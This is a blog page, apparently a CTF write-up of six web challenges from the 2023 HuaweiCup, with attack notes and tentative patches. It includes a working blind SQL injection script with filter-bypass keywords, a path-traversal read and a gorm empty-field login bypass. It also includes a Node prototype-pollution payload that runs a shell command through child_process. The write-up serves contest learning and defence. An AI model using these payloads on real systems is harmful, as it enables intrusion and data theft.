@@ -1,0 +1,352 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="2023 HuaweiCupConstellation_queryAttackAn easy SSTI blind injection. (However, I have cleaned my exp after the contest…) PatchI think it is just changing render_template_string to render_template, but">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2023 HuaweiCup">
+<meta property="og:url" content="http://example.com/2023/11/14/2023-HuaweiCup/index.html">
+<meta property="og:site_name" content="P3ngu1nW">
+<meta property="og:description" content="2023 HuaweiCupConstellation_queryAttackAn easy SSTI blind injection. (However, I have cleaned my exp after the contest…) PatchI think it is just changing render_template_string to render_template, but">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2023/11/14/2023-HuaweiCup/image-20231114180119442.png">
+<meta property="og:image" content="http://example.com/2023/11/14/2023-HuaweiCup/image-20231114190856455.png">
+<meta property="og:image" content="http://example.com/2023/11/14/2023-HuaweiCup/image-20231114194212676.png">
+<meta property="og:image" content="http://example.com/2023/11/14/2023-HuaweiCup/image-20231114200625388.png">
+<meta property="article:published_time" content="2023-11-14T09:51:34.000Z">
+<meta property="article:modified_time" content="2023-11-14T12:48:59.715Z">
+<meta property="article:author" content="P3ngu1nW">
+<meta property="article:tag" content="WP">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2023/11/14/2023-HuaweiCup/image-20231114180119442.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>2023 HuaweiCup</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/p3ngu1nw">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/08/31/Hessian/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/11/14/2023-HuaweiCup/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/11/14/2023-HuaweiCup/&text=2023 HuaweiCup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/11/14/2023-HuaweiCup/&title=2023 HuaweiCup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/11/14/2023-HuaweiCup/&is_video=false&description=2023 HuaweiCup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=2023 HuaweiCup&body=Check out this article: http://example.com/2023/11/14/2023-HuaweiCup/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/11/14/2023-HuaweiCup/&title=2023 HuaweiCup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/11/14/2023-HuaweiCup/&title=2023 HuaweiCup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/11/14/2023-HuaweiCup/&title=2023 HuaweiCup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/11/14/2023-HuaweiCup/&title=2023 HuaweiCup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/11/14/2023-HuaweiCup/&name=2023 HuaweiCup&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/11/14/2023-HuaweiCup/&t=2023 HuaweiCup"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2023-HuaweiCup"><span class="toc-number">1.</span> <span class="toc-text">2023 HuaweiCup</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Constellation-query"><span class="toc-number">1.1.</span> <span class="toc-text">Constellation_query</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Attack"><span class="toc-number">1.1.1.</span> <span class="toc-text">Attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Patch"><span class="toc-number">1.1.2.</span> <span class="toc-text">Patch</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#include-shell"><span class="toc-number">1.2.</span> <span class="toc-text">include_shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Attack-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">Attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Patch-1"><span class="toc-number">1.2.2.</span> <span class="toc-text">Patch</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#read-article"><span class="toc-number">1.3.</span> <span class="toc-text">read_article</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Attack-2"><span class="toc-number">1.3.1.</span> <span class="toc-text">Attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Patch-2"><span class="toc-number">1.3.2.</span> <span class="toc-text">Patch</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Oddly-Sordid-Command"><span class="toc-number">1.4.</span> <span class="toc-text">Oddly_Sordid_Command</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#attack"><span class="toc-number">1.4.1.</span> <span class="toc-text">attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Patch-3"><span class="toc-number">1.4.2.</span> <span class="toc-text">Patch</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezgo"><span class="toc-number">1.5.</span> <span class="toc-text">ezgo</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Attack-3"><span class="toc-number">1.5.1.</span> <span class="toc-text">Attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Patch-4"><span class="toc-number">1.5.2.</span> <span class="toc-text">Patch</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#imgupl0ad"><span class="toc-number">1.6.</span> <span class="toc-text">imgupl0ad</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Attack-4"><span class="toc-number">1.6.1.</span> <span class="toc-text">Attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Patch-5"><span class="toc-number">1.6.2.</span> <span class="toc-text">Patch</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        2023 HuaweiCup
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">P3ngu1nW</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-11-14T09:51:34.000Z" class="dt-published" itemprop="datePublished">2023-11-14</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/WP/" rel="tag">WP</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="2023-HuaweiCup"><a href="#2023-HuaweiCup" class="headerlink" title="2023 HuaweiCup"></a>2023 HuaweiCup</h1><h2 id="Constellation-query"><a href="#Constellation-query" class="headerlink" title="Constellation_query"></a>Constellation_query</h2><h3 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h3><p>An easy SSTI blind injection. (However, I have cleaned my exp after the contest…)</p>
+<h3 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h3><p>I think it is just changing <code>render_template_string</code> to <code>render_template</code>, but i failed TwT</p>
+<p>Maybe it’s the problem of restarting the server?</p>
+<h2 id="include-shell"><a href="#include-shell" class="headerlink" title="include_shell"></a>include_shell</h2><h3 id="Attack-1"><a href="#Attack-1" class="headerlink" title="Attack"></a>Attack</h3><p>Easy SQL injection and include rce.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://192.168.18.28/login.php&quot;</span></span><br><span class="line"></span><br><span class="line">password = <span class="string">&quot;admin&#x27; oorr asasciicii(substr((selselectect passwoorrd frfromom user WHERE username = &#x27;admin&#x27;),&#123;id&#125;,1))=&#123;ch&#125;-- &quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> <span class="built_in">id</span> <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">32</span>):</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">127</span>, <span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        <span class="comment"># print(ch)</span></span><br><span class="line">        res = requests.post(url, data=&#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&quot;</span>, <span class="string">&quot;password&quot;</span>: password.<span class="built_in">format</span>(<span class="built_in">id</span>=<span class="built_in">id</span>, ch=ch)&#125;)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;admin.html&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag = flag + <span class="built_in">chr</span>(ch)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<img src="/2023/11/14/2023-HuaweiCup/image-20231114180119442.png" class title="image-20231114180119442">
+
+<h3 id="Patch-1"><a href="#Patch-1" class="headerlink" title="Patch"></a>Patch</h3><p>In the case of sql injection, I think we can use <code>while</code> to remove the dangerous keyword.</p>
+<p>In the case of LFI, I think we can filter the <code>/</code>.</p>
+<p>But I didn’t know that <code>update.sh</code> is executed in <code>/var/www/html</code>, and the PHP file I patched is in <code>/update</code>, so I don’t know if this works or not.</p>
+<h2 id="read-article"><a href="#read-article" class="headerlink" title="read_article"></a>read_article</h2><h3 id="Attack-2"><a href="#Attack-2" class="headerlink" title="Attack"></a>Attack</h3><p>Let <code>article_id</code> to be <code>../app.py</code> to read the source code and there exists a <code>pickle deserialization</code> in <code>/shell01</code></p>
+<h3 id="Patch-2"><a href="#Patch-2" class="headerlink" title="Patch"></a>Patch</h3><p>Can I just ban the <code>pickle.loads?</code>.</p>
+<h2 id="Oddly-Sordid-Command"><a href="#Oddly-Sordid-Command" class="headerlink" title="Oddly_Sordid_Command"></a>Oddly_Sordid_Command</h2><h3 id="attack"><a href="#attack" class="headerlink" title="attack"></a>attack</h3><p>Use <code>X-Forwarded-For</code> to bypass the <code>ctx.RemoteAddr()</code> and use <code>strings </code> and <code>?</code> to read the flag.</p>
+<img src="/2023/11/14/2023-HuaweiCup/image-20231114190856455.png" class title="image-20231114190856455">
+
+<h3 id="Patch-3"><a href="#Patch-3" class="headerlink" title="Patch"></a>Patch</h3><p>I don’t know how to patch the XFF problem, but we can patch the <code>exec.Command</code>.</p>
+<p><code>cmd, _ := exec.Command(&quot;figlet&quot;, str).Output()</code></p>
+<h2 id="ezgo"><a href="#ezgo" class="headerlink" title="ezgo"></a>ezgo</h2><h3 id="Attack-3"><a href="#Attack-3" class="headerlink" title="Attack"></a>Attack</h3><p>This problem use <code>gorm.io/driver/sqlite</code> to handle the SQLite.</p>
+<p>However, it has a weird feature in its <code>Where</code> method. That is, if we pass a blank value to the <code>gorm</code>, it will ignore the specific limitation!</p>
+<p>So let’s check the <code>login</code> function</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">login</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	username := c.PostForm(<span class="string">&quot;username&quot;</span>)</span><br><span class="line">	password := c.PostForm(<span class="string">&quot;password&quot;</span>)</span><br><span class="line">	token := c.PostForm(<span class="string">&quot;token&quot;</span>)</span><br><span class="line"></span><br><span class="line">	user := &amp;User&#123;&#125;</span><br><span class="line">	err := db.Where(&amp;User&#123;UserName: username, Password: password, Token: token&#125;).First(&amp;user).Error</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="string">&quot;msg&quot;</span>: <span class="string">&quot;登录失败&quot;</span>&#125;)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	c.JSON(http.StatusOK, gin.H&#123;<span class="string">&quot;msg&quot;</span>: <span class="string">&quot;登录成功&quot;</span>, <span class="string">&quot;user&quot;</span>: user&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>If we just post <code>login=admin</code>, it will let us login as <code>admin</code> and give us its token.</p>
+<img src="/2023/11/14/2023-HuaweiCup/image-20231114194212676.png" class title="image-20231114194212676">
+
+<p>Next we can use <code>.shell</code> command to reverse shell.</p>
+<img src="/2023/11/14/2023-HuaweiCup/image-20231114200625388.png" class title="image-20231114200625388">
+
+<h3 id="Patch-4"><a href="#Patch-4" class="headerlink" title="Patch"></a>Patch</h3><p>Maybe we can filter the <code>password=&quot;&quot;</code> and <code>token==&quot;&quot;</code></p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> password == <span class="string">&quot;&quot;</span> || token == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">	c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="string">&quot;msg&quot;</span>: <span class="string">&quot;登录失败&quot;</span>&#125;)</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="imgupl0ad"><a href="#imgupl0ad" class="headerlink" title="imgupl0ad"></a>imgupl0ad</h2><h3 id="Attack-4"><a href="#Attack-4" class="headerlink" title="Attack"></a>Attack</h3><p>Node18 native Prototype Pollution.</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;prototype&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;constructor&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;shell&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/proc/self/exe&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;argv0&quot;</span><span class="punctuation">:</span></span><br><span class="line"><span class="string">&quot;console.log(require(&#x27;child_process&#x27;).execSync(&#x27;cp /flag</span></span><br><span class="line"><span class="string">/app/public/flag&#x27;).toString())//&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;NODE_OPTIONS&quot;</span><span class="punctuation">:</span> <span class="string">&quot;--require /proc/self/cmdline&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Patch-5"><a href="#Patch-5" class="headerlink" title="Patch"></a>Patch</h3><p>Filter the <code>prototype</code> and <code>constructor</code></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/p3ngu1nw">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2023-HuaweiCup"><span class="toc-number">1.</span> <span class="toc-text">2023 HuaweiCup</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Constellation-query"><span class="toc-number">1.1.</span> <span class="toc-text">Constellation_query</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Attack"><span class="toc-number">1.1.1.</span> <span class="toc-text">Attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Patch"><span class="toc-number">1.1.2.</span> <span class="toc-text">Patch</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#include-shell"><span class="toc-number">1.2.</span> <span class="toc-text">include_shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Attack-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">Attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Patch-1"><span class="toc-number">1.2.2.</span> <span class="toc-text">Patch</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#read-article"><span class="toc-number">1.3.</span> <span class="toc-text">read_article</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Attack-2"><span class="toc-number">1.3.1.</span> <span class="toc-text">Attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Patch-2"><span class="toc-number">1.3.2.</span> <span class="toc-text">Patch</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Oddly-Sordid-Command"><span class="toc-number">1.4.</span> <span class="toc-text">Oddly_Sordid_Command</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#attack"><span class="toc-number">1.4.1.</span> <span class="toc-text">attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Patch-3"><span class="toc-number">1.4.2.</span> <span class="toc-text">Patch</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezgo"><span class="toc-number">1.5.</span> <span class="toc-text">ezgo</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Attack-3"><span class="toc-number">1.5.1.</span> <span class="toc-text">Attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Patch-4"><span class="toc-number">1.5.2.</span> <span class="toc-text">Patch</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#imgupl0ad"><span class="toc-number">1.6.</span> <span class="toc-text">imgupl0ad</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Attack-4"><span class="toc-number">1.6.1.</span> <span class="toc-text">Attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Patch-5"><span class="toc-number">1.6.2.</span> <span class="toc-text">Patch</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/11/14/2023-HuaweiCup/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/11/14/2023-HuaweiCup/&text=2023 HuaweiCup"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/11/14/2023-HuaweiCup/&title=2023 HuaweiCup"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/11/14/2023-HuaweiCup/&is_video=false&description=2023 HuaweiCup"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=2023 HuaweiCup&body=Check out this article: http://example.com/2023/11/14/2023-HuaweiCup/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/11/14/2023-HuaweiCup/&title=2023 HuaweiCup"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/11/14/2023-HuaweiCup/&title=2023 HuaweiCup"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/11/14/2023-HuaweiCup/&title=2023 HuaweiCup"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/11/14/2023-HuaweiCup/&title=2023 HuaweiCup"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/11/14/2023-HuaweiCup/&name=2023 HuaweiCup&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/11/14/2023-HuaweiCup/&t=2023 HuaweiCup"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023
+    P3ngu1nW
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/p3ngu1nw">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
